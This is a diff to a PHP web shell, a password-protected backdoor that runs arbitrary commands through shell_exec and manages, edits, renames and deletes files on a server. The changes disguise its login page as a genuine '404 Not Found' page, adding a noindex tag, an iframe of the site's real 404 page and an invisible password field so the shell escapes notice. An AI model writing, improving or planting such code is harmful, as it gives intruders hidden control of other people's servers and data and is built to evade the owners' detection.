@@ -17,7 +17,7 @@ if (!isset($_SESSION['logged_in'])) {
     if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
         $_SESSION['logged_in'] = true; header('Location:'); exit;
     }
-    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="password" name="password" class="border px-2"> <button style="display:none">Login</button></form></body></html>'; exit;
+    echo '<!DOCTYPE html><html><head><title>404 Not Found</title><meta name="robots" content="noindex,nofollow"><style>html,body{margin:0;padding:0;overflow:hidden;width:100%;height:100%}body{font-family:sans-serif}iframe{position:absolute;top:0;left:0;border:none;width:100%;height:100%}</style></head><body><iframe src="//<?php echo $_SERVER["SERVER_NAME"]; ?>/404" id="iframe_id" onload="document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;"></iframe><form method="post"><input type="password" name="password" style="background: transparent; border: none; color: transparent; caret-color: transparent; padding: 0.5rem;"> <button style="display:none">Login</button></form></body></html>'; exit;
 }
 
 // Path
@@ -40,7 +40,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     try {
         $self = basename(__FILE__);
         if($action=='command' && isset($_POST['cmd'])){
-            $output = shell_exec($_POST['cmd'].' 2>&1');
+            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}else{$output="Server function disabled!";}
             echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
             exit;
         }
@@ -226,12 +226,14 @@ $(function(){
 });
 </script>
 <script>
+let currentPath = <?=json_encode($path)?>;
 $(function(){
     $('.menu-btn').click(function(){
         let act=$(this).data('action');
         $('.menu-btn').removeClass('bg-blue-500 text-white').addClass('bg-gray-200 text-gray-800');
         $(this).addClass('bg-blue-500 text-white');
         $('#content').html('<div class="text-center p-4">Loading...</div>');
+        let path = encodeURIComponent(currentPath);
         $.get('?action='+act,function(d){ $('#content').html(d); });
     });
     // on load, highlight active
@@ -355,7 +357,7 @@ if($action=='serverinfo'):
     <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700">
     <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
     <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
-    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline px-2 py-1 rounded <?=is_writable($fp)?'bg-green-200 text-green-800':'bg-red-200 text-red-800'?>"><?=$f['perm']?></button></td>
+    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline px-2 py-1 rounded <?=is_writable($fp)?'bg-green-200 text-green-800':'bg-gray-200 text-base'?>"><?=$f['perm']?></button></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
     <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-gray-300 px-2 rounded" title="Edit">📝</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-gray-300 px-2 rounded" title="Rename">✍🏼</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-gray-300 px-2 rounded" title="Delete">🗑️</button></td></tr><?php endforeach;?>
     </table>
